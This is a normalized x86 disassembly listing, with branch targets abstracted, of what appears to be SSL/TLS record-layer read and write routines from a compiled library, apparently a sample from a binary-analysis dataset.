call sub_1000e7d0
add esp 0x4
test ah 0x30
jne r-xdata
mov edx [ esi + 0x10 ]
push 0x0
push 0x0
push 0xb
push edx
mov [ esi + 0x18 ] 0x2
call sub_10020c60
add esp 0x10
test eax eax
jle r-xdata
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
push edx
push eax
push 0x17
push esi
call sub_100128a0
add esp 0x10
test eax eax
jle r-xdata
mov eax [ esi + 0x58 ]
mov [ esi + 0x34 ] 0x3004
mov [ eax + 0x1a8 ] 0x0
mov eax [ esi + 0x58 ]
mov edx [ eax + 0x1b0 ]
inc edx
mov [ eax + 0x1b0 ] edx
mov eax [ esi + 0x58 ]
inc [ eax + 0x1ac ]
pop esi
retn
push esi
mov [ esi + 0x18 ] 0x1
call sub_1000e790
mov eax [ esi + 0x58 ]
add esp 0x4
mov ecx [ eax ]
and ecx 0xfffffffb
mov [ eax ] ecx
mov esi [ esi + 0x58 ]
mov eax [ esi + 0x4 ]
mov [ esi + 0x4 ] 0x0
pop esi
retn
mov ecx [ esi + 0x58 ]
mov [ ecx + 0x4 ] eax
sub_10012250
push ebx
push esi
push edi
push 0x0
call [ SetLastError@IAT ]
mov esi [ esp + 0x10 ]
mov eax [ esi + 0x58 ]
mov ecx [ eax + 0x1a8 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x58 ]
mov edi [ esp + 0x18 ]
mov ebx [ esp + 0x14 ]
push 0x0
push edi
mov [ ecx + 0x1b4 ] 0x1
mov edx [ esi + 0x8 ]
push ebx
push 0x17
push esi
call [ edx + 0x34 ]
add esp 0x14
cmp eax 0xffffffff
jne r-xdata
mov ecx [ eax + 0xec ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x58 ]
pop edi
pop esi
pop ebx
mov [ ecx + 0x1b4 ] 0x0
retn
mov ecx [ esi + 0x58 ]
cmp [ ecx + 0x1b4 ] 0x2
jne r-xdata
mov ecx [ eax + 0xfc ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x8 ]
push 0x0
push edi
push ebx
inc ecx
push 0x17
push esi
mov [ esi + 0x1c ] ecx
call [ edx + 0x34 ]
mov ecx [ esi + 0x1c ]
add esp 0x14
dec ecx
mov [ esi + 0x1c ] ecx
pop edi
pop esi
pop ebx
retn
push esi
call sub_1000e7d0
add esp 0x4
test ah 0x30
jne r-xdata
mov eax [ esi + 0x58 ]
mov [ esi + 0x34 ] 0x3004
mov [ eax + 0x1a8 ] 0x0
mov eax [ esi + 0x58 ]
mov edx [ eax + 0x1b0 ]
inc edx
mov [ eax + 0x1b0 ] edx
mov eax [ esi + 0x58 ]
inc [ eax + 0x1ac ]
sub_10012330
push ebx
push esi
push edi
push 0x0
call [ SetLastError@IAT ]
mov esi [ esp + 0x10 ]
mov eax [ esi + 0x58 ]
mov ecx [ eax + 0x1a8 ]
test ecx ecx
je r-xdata
mov ecx [ esi + 0x58 ]
mov edi [ esp + 0x18 ]
mov ebx [ esp + 0x14 ]
push 0x1
push edi
mov [ ecx + 0x1b4 ] 0x1
mov edx [ esi + 0x8 ]
push ebx
push 0x17
push esi
call [ edx + 0x34 ]
add esp 0x14
cmp eax 0xffffffff
jne r-xdata
mov ecx [ eax + 0xec ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x58 ]
pop edi
pop esi
pop ebx
mov [ ecx + 0x1b4 ] 0x0
retn
mov ecx [ esi + 0x58 ]
cmp [ ecx + 0x1b4 ] 0x2
jne r-xdata
mov ecx [ eax + 0xfc ]
test ecx ecx
jne r-xdata
mov ecx [ esi + 0x1c ]
mov edx [ esi + 0x8 ]
push 0x1
push edi
push ebx
inc ecx
push 0x17
push esi
mov [ esi + 0x1c ] ecx
call [ edx + 0x34 ]
mov ecx [ esi + 0x1c ]
add esp 0x14
dec ecx
mov [ esi + 0x1c ] ecx
pop edi
pop esi
pop ebx
retn
push esi
call sub_1000e7d0
add esp 0x4
test ah 0x30
jne r-xdata
mov eax [ esi + 0x58 ]
mov [ esi + 0x34 ] 0x3004
mov [ eax + 0x1a8 ] 0x0
mov eax [ esi + 0x58 ]
mov edx [ eax + 0x1b0 ]
inc edx
mov [ eax + 0x1b0 ] edx
mov eax [ esi + 0x58 ]
inc [ eax + 0x1ac ]
sub_10012440
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
mov eax [ esi + 0x58 ]
cmp [ eax + 0x1a8 ] edi
je r-xdata
mov eax edi
pop edi
pop esi
retn
cmp [ eax + 0xec ] edi
jne r-xdata
cmp [ eax + 0xfc ] edi
jne r-xdata
push esi
call sub_1000e7d0
add esp 0x4
test ah 0x30
jne r-xdata
mov eax [ esi + 0x58 ]
mov [ esi + 0x34 ] 0x3004
mov [ eax + 0x1a8 ] edi
mov eax [ esi + 0x58 ]
pop edi
mov ecx [ eax + 0x1b0 ]
inc ecx
mov [ eax + 0x1b0 ] ecx
mov esi [ esi + 0x58 ]
mov eax [ esi + 0x1ac ]
inc eax
mov [ esi + 0x1ac ] eax
mov eax 0x1
pop esi
retn
sub_100124d0
call sub_100112d0
mov ecx [ esp + 0x4 ]
cmp ecx eax
jae r-xdata
sub ecx eax
push ecx
call sub_100195d0
add esp 0x4
retn
push ecx
call sub_100112e0
add esp 0x4
retn
sub_10012500
push esi
call sub_100112d0
mov esi [ esp + 0x8 ]
push esi
call sub_10012030
add esp 0x4
test eax eax
jne r-xdata
pop esi
retn
push esi
call sub_100197b0
add esp 0x4
sub_10012530
mov ecx [ esp + 0x8 ]
test ecx ecx
je r-xdata
mov eax 0x3
retn
mov eax [ esp + 0x4 ]
mov eax [ eax + 0x8 ]
mov edx eax
mov [ ecx + 0x2 ] al
sar edx 0x10
mov [ ecx ] dl
mov edx eax
sar edx 0x8
mov [ ecx + 0x1 ] dl
sub_10012560
push esi
push 0x0
call [ SetLastError@IAT ]
mov esi [ esp + 0x8 ]
push esi
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
push esi
call sub_1000e650
add esp 0x4
or eax 0xffffffff
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
push esi
call [ esi + 0x20 ]
add esp 0x4
test eax eax
jl r-xdata
pop esi
retn
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push esi
call sub_1000d990
add esp 0xc
pop esi
retn
push 0x8e
push r--data
push 0xe5
push 0x78
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub_100125e0
push esi
push 0x0
call [ SetLastError@IAT ]
mov esi [ esp + 0x8 ]
push esi
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
push esi
call sub_1000e650
add esp 0x4
or eax 0xffffffff
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
push esi
call [ esi + 0x20 ]
add esp 0x4
test eax eax
jl r-xdata
pop esi
retn
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push esi
call sub_1000d9f0
add esp 0xc
pop esi
retn
push 0xa5
push r--data
push 0xe5
push 0xed
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub_10012660
push esi
push 0x0
call [ SetLastError@IAT ]
mov esi [ esp + 0x8 ]
push esi
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
push esi
call sub_1000e650
add esp 0x4
or eax 0xffffffff
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
push esi
call [ esi + 0x20 ]
add esp 0x4
test eax eax
jl r-xdata
pop esi
retn
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0xc ]
push eax
push ecx
push esi
call sub_1000da40
add esp 0xc
pop esi
retn
push 0xbc
push r--data
push 0xe5
push 0x79
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop esi
retn
sub_100126e0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
mov edi [ esp + 0x20 ]
xor ebp ebp
cmp edi ebp
jne r-xdata
push esi
call sub_1002c960
add esp 0x4
cmp eax 0xfeff
jne r-xdata
mov eax [ esi + 0x58 ]
cmp [ eax + 0xec ] ebp
jne r-xdata
mov ebx [ esp + 0x18 ]
cmp edi ebp
je r-xdata
mov eax [ esi + 0x58 ]
mov ecx [ eax + 0xe8 ]
mov edx [ eax + 0xe0 ]
add ecx edx
mov [ esi + 0x50 ] ebp
mov [ esi + 0x4c ] ecx
mov [ eax + 0xe8 ] ebp
cmp [ esi + 0x60 ] ebp
jne r-xdata
mov edx [ esi + 0x50 ]
pop edi
add edx ebx
mov [ esi + 0x50 ] edx
mov ecx [ eax + 0xec ]
sub ecx ebx
mov [ eax + 0xec ] ecx
mov esi [ esi + 0x58 ]
mov eax [ esi + 0xe8 ]
add eax ebx
mov [ esi + 0xe8 ] eax
pop esi
mov eax ebx
pop ebp
pop ebx
retn
mov edx [ esi + 0x58 ]
mov eax [ edx + 0xec ]
cmp eax ebp
jle r-xdata
mov ebp [ esi + 0x50 ]
mov ecx [ eax + 0xe4 ]
mov edx [ esp + 0x1c ]
sub ecx ebp
cmp edx ecx
jle r-xdata
mov [ esp + 0x1c ] ebx
mov ebx [ esp + 0x18 ]
cmp ebx eax
jle r-xdata
cmp ebx [ esp + 0x1c ]
jle r-xdata
mov [ esp + 0x1c ] ecx
mov eax [ esi + 0x58 ]
mov edi [ eax + 0xec ]
cmp edi ebx
jl r-xdata
mov ebx eax
jmp r-xdata
mov ecx [ esi + 0x4c ]
mov eax [ eax + 0xe0 ]
cmp ecx eax
je r-xdata
push 0xad
push r--data
push 0x44
push 0x95
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
cmp edi ebx
jge r-xdata
lea edx [ edi + ebp ]
push edx
push ecx
push eax
call memmove
mov eax [ esi + 0x58 ]
add esp 0xc
mov ecx [ eax + 0xe0 ]
mov [ esi + 0x4c ] ecx
mov edx [ esi + 0x58 ]
add ebp ebx
sub edi ebx
mov [ edx + 0xe8 ] ebp
mov eax [ esi + 0x58 ]
mov [ eax + 0xec ] edi
mov eax [ esi + 0x50 ]
add eax ebx
mov [ esi + 0x18 ] 0x1
mov [ esi + 0x50 ] eax
pop edi
pop esi
mov eax ebx
pop ebp
pop ebx
retn
push 0x0
call [ SetLastError@IAT ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
push 0xca
push r--data
push 0xd3
push 0x95
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
mov edx [ esp + 0x1c ]
mov ecx [ esi + 0x58 ]
sub edx edi
mov [ esi + 0x18 ] 0x3
push edx
mov edx [ ecx + 0xe0 ]
add edx edi
add edx ebp
push edx
push eax
call sub_10020930
add esp 0xc
test eax eax
jle r-xdata
mov ecx [ esi + 0x58 ]
mov [ ecx + 0xec ] edi
pop edi
pop esi
pop ebp
pop ebx
retn
add edi eax
cmp edi ebx
jge r-xdata
jmp r-xdata
sub_100128a0
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
push esi
mov eax [ esi + 0x58 ]
mov [ esi + 0x18 ] 0x1
mov edi [ eax + 0x160 ]
mov [ eax + 0x160 ] 0x0
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
mov ebp [ esp + 0x20 ]
mov ebx [ esp + 0x18 ]
sub ebp edi
mov eax [ esi + 0x1c ]
test eax eax
jne r-xdata
push 0x0
push eax
mov eax [ esp + 0x24 ]
lea ecx [ edi + eax ]
push ecx
push ebx
push esi
call sub_10012980
add esp 0x14
test eax eax
jle r-xdata
mov eax ebp
push esi
call [ esi + 0x20 ]
add esp 0x4
test eax eax
jl r-xdata
mov edx [ esi + 0x58 ]
mov [ edx + 0x160 ] edi
pop edi
pop esi
pop ebp
pop ebx
retn
cmp eax ebp
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
jne r-xdata
mov ecx [ esi + 0x58 ]
add eax edi
mov [ ecx + 0xdc ] 0x0
cmp ebx 0x17
jne r-xdata
push 0x212
push r--data
push 0xe5
push 0x9e
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
retn
sub ebp eax
add edi eax
jmp r-xdata
test [ esi + 0xf8 ] 0x1
jne r-xdata
cmp ebp 0x4000
mov eax 0x4000
ja r-xdata
sub_10012980
mov eax 0x10
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x18 ]
push ebp
push esi
mov eax [ ebx + 0x58 ]
push edi
mov [ esp + 0x10 ] 0x0
mov ecx [ eax + 0xfc ]
test ecx ecx
je r-xdata
mov ecx [ eax + 0x1a0 ]
test ecx ecx
je r-xdata
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x28 ]
push eax
push ecx
push edx
push ebx
call sub_10012c50
add esp 0x10
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov edi [ esp + 0x30 ]
test edi edi
jne r-xdata
mov eax [ ebx + 0x8 ]
push ebx
call [ eax + 0x3c ]
add esp 0x4
test eax eax
jle r-xdata
mov eax [ ebx + 0x58 ]
lea esi [ eax + 0x128 ]
lea ebp [ eax + 0xf0 ]
mov eax [ ebx + 0xbc ]
mov [ esp + 0x24 ] esi
test eax eax
mov [ esp + 0x1c ] ebp
je r-xdata
mov eax [ esp + 0x34 ]
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov [ esp + 0x14 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x88 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x10
retn
mov ebp [ ebp ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0x28 ]
add ebp edx
mov [ ebp ] al
mov [ esi ] eax
mov edx [ ebx ]
inc ebp
sar edx 0x8
mov [ ebp ] dl
mov al [ ebx ]
mov edx [ esp + 0x2c ]
inc ebp
mov [ ebp ] al
inc ebp
mov [ esp + 0x18 ] ebp
add ebp 0x2
mov [ esi + 0xc ] ebp
mov [ esi + 0x4 ] edi
mov [ esi + 0x10 ] edx
mov eax [ ebx + 0x90 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8c ]
test eax eax
jne r-xdata
mov ecx edi
mov esi edx
mov eax ecx
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
mov eax [ esp + 0x24 ]
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ eax + 0xc ]
mov esi eax
mov [ eax + 0x10 ] ecx
mov edi [ ebx + 0x58 ]
add edi 0x128
mov ecx [ edi + 0x4 ]
mov edx [ edi + 0x10 ]
push ecx
mov ecx [ edi + 0xc ]
push edx
push 0x4400
push ecx
push eax
call sub_1001d3a0
add esp 0x14
test eax eax
jl r-xdata
push eax
call sub_1002b600
mov [ esp + 0x18 ] eax
mov eax [ esp + 0x38 ]
add esp 0x4
test eax eax
jne r-xdata
mov edx [ ebx + 0x8 ]
push 0x1
push ebx
mov eax [ edx + 0x64 ]
call [ eax ]
mov ecx [ esi + 0x4 ]
mov eax [ esp + 0x20 ]
shr ecx 0x8
mov [ eax ] cl
mov dl [ esi + 0x4 ]
mov ecx [ esp + 0x30 ]
mov [ eax + 0x1 ] dl
mov edx [ esi + 0x4 ]
mov eax [ esp + 0x3c ]
add edx 0x5
add esp 0x8
mov [ esi ] ecx
mov [ esi + 0x4 ] edx
test eax eax
mov esi edx
je r-xdata
mov ecx [ esi + 0x4 ]
mov edx [ ebx + 0x8 ]
add ecx ebp
push 0x1
mov eax [ edx + 0x64 ]
push ecx
push ebx
call [ eax + 0x4 ]
mov eax [ esi + 0x4 ]
add esp 0xc
add eax edi
mov [ esi + 0x10 ] ebp
mov [ esi + 0x4 ] eax
mov [ esi + 0xc ] ebp
push 0x295
push r--data
push 0x8d
push 0x68
push 0x14
call sub_1001de60
add esp 0x14
mov edx [ edi + 0xc ]
mov [ edi + 0x4 ] eax
mov [ edi + 0x10 ] edx
jmp r-xdata
mov ecx [ ebx + 0x58 ]
mov eax [ ecx + 0xdc ]
test eax eax
jne r-xdata
mov eax [ esp + 0x10 ]
add esi eax
mov eax [ esp + 0x1c ]
mov [ eax + 0xc ] esi
mov [ eax + 0x8 ] 0x0
mov edx [ ebx + 0x58 ]
mov eax [ esp + 0x30 ]
push eax
mov [ edx + 0x164 ] eax
mov esi [ ebx + 0x58 ]
mov edx [ esp + 0x30 ]
mov [ esi + 0x170 ] edx
mov esi [ ebx + 0x58 ]
push edx
push ecx
mov [ esi + 0x168 ] ecx
mov esi [ ebx + 0x58 ]
push ebx
mov [ esi + 0x16c ] eax
call sub_10012c50
add esp 0x10
mov eax esi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
mov edi [ esp + 0x14 ]
test edi edi
je r-xdata
mov eax [ ecx + 0xd8 ]
test eax eax
je r-xdata
mov [ ecx + 0xdc ] 0x1
cmp [ esp + 0x28 ] 0x17
jne r-xdata
mov ecx [ esp + 0x2c ]
push 0x1
push 0x0
push ecx
push 0x17
push ebx
call sub_10012980
add esp 0x14
mov [ esp + 0x10 ] eax
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x10
retn
mov ecx [ ebx + 0x58 ]
add eax 0x4805
cmp [ ecx + 0xf4 ] eax
jae r-xdata
push 0x272
push r--data
push 0x44
push 0x68
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x10
retn
sub_10012c50
mov edx [ esp + 0x10 ]
push esi
mov esi [ esp + 0x8 ]
push edi
mov eax [ esi + 0x58 ]
mov ecx [ eax + 0x164 ]
cmp ecx edx
jg r-xdata
push 0x2db
push r--data
push 0x7f
push 0x9f
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
mov edx [ eax + 0x170 ]
mov ecx [ esp + 0x14 ]
cmp edx ecx
je r-xdata
mov eax [ eax + 0x168 ]
mov ecx [ esp + 0x10 ]
cmp eax ecx
jne r-xdata
test [ esi + 0xf8 ] 0x2
je r-xdata
mov edi [ SetLastError@IAT ]
push 0x2eb
push r--data
push 0x80
push 0x9f
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
mov eax [ esi + 0x58 ]
mov [ esi + 0x18 ] 0x2
mov edx [ eax + 0xfc ]
push edx
mov edx [ eax + 0xf8 ]
add edx [ eax + 0xf0 ]
push edx
push ecx
call sub_100209d0
add esp 0xc
jmp r-xdata
mov eax [ esi + 0x58 ]
pop edi
mov [ eax + 0xfc ] 0x0
mov ecx [ esi + 0x58 ]
mov [ esi + 0x18 ] 0x1
pop esi
mov eax [ ecx + 0x16c ]
retn
test eax eax
jle r-xdata
mov ecx [ esi + 0x58 ]
cmp eax [ ecx + 0xfc ]
je r-xdata
mov ecx [ esi ]
cmp ecx 0xfeff
je r-xdata
mov edx [ ecx + 0xf8 ]
add edx eax
mov [ ecx + 0xf8 ] edx
mov ecx [ esi + 0x58 ]
sub [ ecx + 0xfc ] eax
jmp r-xdata
mov edx [ esi + 0x58 ]
pop edi
pop esi
mov [ edx + 0xfc ] 0x0
retn
cmp ecx 0x100
jne r-xdata
push 0x0
call edi
mov ecx [ esi + 0x10 ]
test ecx ecx
je r-xdata
pop edi
pop esi
retn
sub_10012d80
mov eax 0x64
call sub_1001d0d0
push ebx
push ebp
mov ebp [ esp + 0x70 ]
push esi
push edi
mov [ esp + 0x10 ] 0x0
mov eax [ ebp + 0x58 ]
mov ecx [ eax + 0xe0 ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x7c ]
test eax eax
je r-xdata
push ebp
call sub_10014540
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esp + 0x88 ]
test ecx ecx
je r-xdata
cmp eax 0x17
je r-xdata
or eax 0xffffffff
cmp eax 0x16
jne r-xdata
cmp eax 0x17
je r-xdata
cmp eax 0x16
jne r-xdata
mov eax [ ebp + 0x1c ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0x58 ]
mov eax [ ecx + 0x15c ]
test eax eax
jbe r-xdata
push 0x32b
push r--data
push 0x44
push 0x94
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov eax [ ebp + 0x58 ]
mov [ ebp + 0x18 ] 0x1
xor edi edi
mov ecx [ eax + 0x104 ]
lea ebx [ eax + 0x100 ]
cmp ecx edi
je r-xdata
push ebp
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
mov esi [ esp + 0x84 ]
add ecx 0x158
xor edi edi
test esi esi
jle r-xdata
mov edi [ ebp + 0xf4 ]
mov edx [ eax + 0xe4 ]
and edi 0xff
xor ecx ecx
and edi 0x20
mov [ esp + 0x18 ] ecx
mov [ esp + 0x78 ] ecx
mov [ esp + 0x14 ] ecx
mov ecx [ ebp + 0xbc ]
sub edx 0x4805
shl edi 0x9
cmp edi edx
mov [ esp + 0x20 ] ecx
mov [ esp + 0x1c ] edi
jne r-xdata
cmp [ ebp + 0x38 ] 0xf1
jne r-xdata
push ebp
call [ ebp + 0x20 ]
add esp 0x4
test eax eax
jl r-xdata
mov edx [ ebp + 0x58 ]
xor esi esi
mov eax [ edx + 0x15c ]
test eax eax
jbe r-xdata
mov eax [ esp + 0x80 ]
push 0x101
push r--data
push 0x44
push 0x8f
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
cmp [ ebp + 0x38 ] 0xf1
jne r-xdata
mov eax [ ebp + 0x58 ]
cmp [ eax + 0x194 ] edi
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov al [ ecx ]
inc ecx
mov [ esi + edx + 0x158 ] al
mov edx [ ebp + 0x58 ]
inc esi
cmp esi [ edx + 0x15c ]
jb r-xdata
mov dl [ ecx ]
inc ecx
mov [ edi + eax ] dl
mov edx [ ebp + 0x58 ]
dec esi
mov ebx [ edx + 0x15c ]
dec ebx
inc edi
test esi esi
mov [ edx + 0x15c ] ebx
jg r-xdata
mov eax [ ebp + 0x58 ]
push 0x0
mov ecx [ eax + 0xe4 ]
push ecx
push 0x5
push ebp
call sub_100126e0
add esp 0x10
test eax eax
jle r-xdata
cmp [ ebp + 0x50 ] 0x5
jae r-xdata
test [ ebp + 0x30 ] 0x2
jne r-xdata
cmp [ ebx ] 0x16
jne r-xdata
push 0x34d
push r--data
push 0xe5
push 0x94
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov edx [ ebp + 0x58 ]
mov ebx [ edx + 0x15c ]
test ebx ebx
jbe r-xdata
mov eax [ ebp + 0x4c ]
xor edx edx
mov [ ebp + 0x38 ] 0xf1
xor ecx ecx
mov dl [ eax ]
inc eax
mov [ ebx ] edx
xor edx edx
mov cl [ eax ]
mov dl [ eax + 0x1 ]
inc eax
mov esi edx
xor edx edx
inc eax
mov dh cl
xor ecx ecx
mov cl [ eax + 0x1 ]
or esi edx
xor edx edx
mov dh [ eax ]
mov eax ecx
or eax edx
mov [ ebx + 0x4 ] eax
mov ecx [ ebp + 0x100 ]
test ecx ecx
jne r-xdata
mov ecx [ ebp + 0x50 ]
mov eax [ ebx + 0x4 ]
sub ecx 0x5
cmp eax ecx
jbe r-xdata
mov [ ebx + 0x4 ] edi
pop edi
mov [ ebp + 0x18 ] 0x1
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x64
retn
mov ecx [ ebx ]
mov esi [ esp + 0x7c ]
cmp esi ecx
je r-xdata
push 0x368
push r--data
mov esi 0xa
push 0x91
jmp r-xdata
and esi 0xffffff00
cmp si 0x300
jne r-xdata
mov edx [ ebp ]
movsx ecx si
cmp ecx edx
jne r-xdata
mov eax [ ebp + 0x4c ]
mov [ ebp + 0x38 ] 0xf0
mov ecx [ ebx + 0x4 ]
lea edx [ edi + 0x4800 ]
add eax 0x5
cmp ecx edx
mov [ ebx + 0x10 ] eax
ja r-xdata
push 0x1
push eax
push eax
push ebp
call sub_100126e0
add esp 0x10
test eax eax
jle r-xdata
push ebp
call sub_1000e7d0
add esp 0x4
test ah 0x30
je r-xdata
cmp ecx 0x16
jne r-xdata
push 0x94
push 0x14
call sub_1001de60
mov eax [ ebp + 0x8 ]
add esp 0x14
mov ecx [ eax + 0x64 ]
push esi
call [ ecx + 0x30 ]
mov ebx eax
mov eax [ ebp ]
add esp 0x4
cmp eax 0x300
jne r-xdata
push 0x127
push r--data
push 0x10b
push 0x8f
push 0x14
call sub_1001de60
add esp 0x14
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov edi [ esp + 0x1c ]
lea edx [ edi + 0x4800 ]
cmp eax edx
ja r-xdata
push 0x11c
push r--data
push 0x10b
push 0x8f
push 0x14
call sub_1001de60
movsx ecx si
add esp 0x14
mov [ ebp ] ecx
mov esi 0x46
jmp r-xdata
push 0x156
push r--data
mov esi 0x16
push 0x96
jmp r-xdata
mov [ ebx + 0xc ] eax
mov eax [ ebp + 0x8 ]
push 0x0
push ebp
mov ecx [ eax + 0x64 ]
call [ ecx ]
add esp 0x8
test eax eax
jg r-xdata
mov eax [ esp + 0x84 ]
cmp eax edi
jle r-xdata
cmp esi 0x17
jne r-xdata
cmp ecx 0x15
jne r-xdata
mov edx 0x4
lea esi [ eax + 0x158 ]
mov [ esp + 0x1c ] edx
add eax 0x15c
jmp r-xdata
cmp ebx edi
jl r-xdata
cmp ebx 0x46
jne r-xdata
push 0x12e
push r--data
mov esi 0x16
push 0xc6
jmp r-xdata
mov edx [ ebp + 0x8 ]
push esi
mov eax [ edx + 0x64 ]
call [ eax + 0x30 ]
mov ebx eax
mov eax [ ebp ]
add esp 0x4
cmp eax 0x300
jne r-xdata
push 0x8f
push 0x14
call sub_1001de60
add esp 0x14
mov eax [ esp + 0x20 ]
test eax eax
je r-xdata
je r-xdata
mov ecx [ ebx + 0x4 ]
cmp eax ecx
jbe r-xdata
cmp [ ebp + 0x7c ] edi
jne r-xdata
mov esi 0x1
mov edx 0x2
lea esi [ eax + 0x150 ]
mov [ esp + 0x1c ] edx
add eax 0x154
mov edi [ eax ]
mov ecx edx
sub ecx edi
mov edi [ ebx + 0x4 ]
cmp edi ecx
jae r-xdata
mov eax [ ebp + 0xbc ]
cmp eax edi
je r-xdata
mov ebx 0x28
jmp r-xdata
test ebx ebx
jl r-xdata
cmp ebx 0x46
jne r-xdata
mov [ esp + 0x18 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x7c ]
test eax eax
je r-xdata
mov [ esp + 0x78 ] 0x1
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov ecx eax
add esi edi
mov edi [ esp + 0x80 ]
mov edx ecx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov ecx [ esp + 0x88 ]
test ecx ecx
jne r-xdata
mov eax ecx
push 0x37e
push r--data
mov esi 0xa
push 0x64
jmp r-xdata
mov eax [ ebp + 0x58 ]
cmp [ eax + 0x154 ] 0x2
jb r-xdata
mov eax [ ebp + 0x58 ]
cmp [ eax + 0x15c ] 0x4
jb r-xdata
mov edi ecx
dec ecx
test edi edi
jbe r-xdata
mov ecx edi
mov eax [ ebp + 0x58 ]
mov [ eax + 0x1a0 ] 0x1
mov ecx [ ebp + 0x58 ]
mov [ ecx + 0x1a4 ] 0x2
mov edx [ ebp + 0x58 ]
mov [ edx + 0x1a5 ] bl
mov eax [ ebp + 0x58 ]
cmp [ eax + 0xfc ] edi
jne r-xdata
mov edx [ ebp + 0xd8 ]
push eax
push edx
call sub_1000f830
add esp 0x8
mov eax [ ebp + 0xbc ]
test eax eax
je r-xdata
mov ebx 0x28
jmp r-xdata
mov eax [ esp + 0x78 ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x80 ]
test eax eax
jne r-xdata
mov edi [ ebx + 0x4 ]
mov esi [ ebx + 0x8 ]
sub edi eax
add esi eax
mov ecx edi
mov [ ebx + 0x4 ] edi
test ecx ecx
mov [ ebx + 0x8 ] esi
jne r-xdata
test [ ebp + 0x30 ] 0x1
jne r-xdata
xor ebx ebx
xor edx edx
mov bl [ eax + 0x150 ]
mov dl [ eax + 0x151 ]
mov [ eax + 0x154 ] edi
mov eax [ ebp + 0x64 ]
cmp eax edi
mov esi edx
je r-xdata
mov dl [ eax + 0x158 ]
test dl dl
jne r-xdata
cmp [ eax ] edx
jb r-xdata
inc ecx
mov [ esp + 0x78 ] ecx
mov ecx [ ebp + 0x8 ]
push ebp
call [ ecx + 0x3c ]
add esp 0x4
mov edx [ ebp + 0x58 ]
mov [ edx + 0x1a0 ] 0x1
mov eax [ ebp + 0x58 ]
mov [ eax + 0x1a4 ] 0x2
mov ecx [ ebp + 0x58 ]
mov [ ecx + 0x1a5 ] bl
mov edx [ ebp + 0x58 ]
mov eax [ edx + 0xfc ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xd8 ]
push eax
push ecx
call sub_1000f830
add esp 0x8
push 0x1a6
push r--data
mov esi 0x14
push 0x119
jmp r-xdata
mov eax [ ebp + 0x84 ]
test eax eax
je r-xdata
mov ecx [ esp + 0x18 ]
test ecx ecx
jne r-xdata
mov [ ebp + 0x38 ] 0xf0
mov [ ebx + 0x8 ] edi
pop edi
pop esi
pop ebp
pop ebx
add esp 0x64
retn
mov [ ebp + 0x18 ] esi
mov [ ebx + 0x4 ] edi
pop edi
pop esi
